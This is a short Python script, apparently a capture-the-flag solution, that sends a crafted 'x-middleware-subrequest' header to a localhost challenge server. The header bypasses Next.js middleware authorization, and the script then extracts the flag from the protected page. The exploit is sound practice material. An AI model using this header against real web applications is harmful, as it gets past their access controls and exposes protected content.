import requests


def solve_52():
    res = requests.post(
        "http://localhost:25052/secret",
        headers={
            "x-middleware-subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        timeout=10,
    )
    start = res.text.find("cuhk25ctf")
    end = res.text.find("</strong>", start)
    flag = res.text[start:end]
    print(flag)
    return flag


if __name__ == "__main__":
    solve_52()
